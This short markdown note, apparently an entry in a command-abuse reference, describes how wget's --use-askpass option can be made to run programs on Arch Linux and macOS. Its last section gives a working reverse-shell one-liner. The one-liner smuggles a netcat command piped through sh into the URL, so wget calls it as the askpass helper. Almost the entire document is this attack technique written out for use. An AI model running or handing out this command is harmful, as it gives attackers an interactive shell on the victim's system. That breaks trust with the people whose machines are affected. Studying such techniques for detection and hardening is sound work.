## archlinux (wget 1.19.2)
Annoyingly difficult, does not allow arguments:
```
wget --use-askpass='w' -O - http://127.0.0.1
```

## macOS (wget 1.19.1)
Annoyingly difficult, does not allow arguments:
```
wget --use-askpass='w' -O - http://127.0.0.1
```

## Reverse shell
wget can be coerced into giving a reverse shell with the following:
```
wget --use-askpass='watch' -O - "http://';nc 127.0.0.1 8000|sh|nc 127.0.0.1 8000;cat;'@127.0.0.1"
```
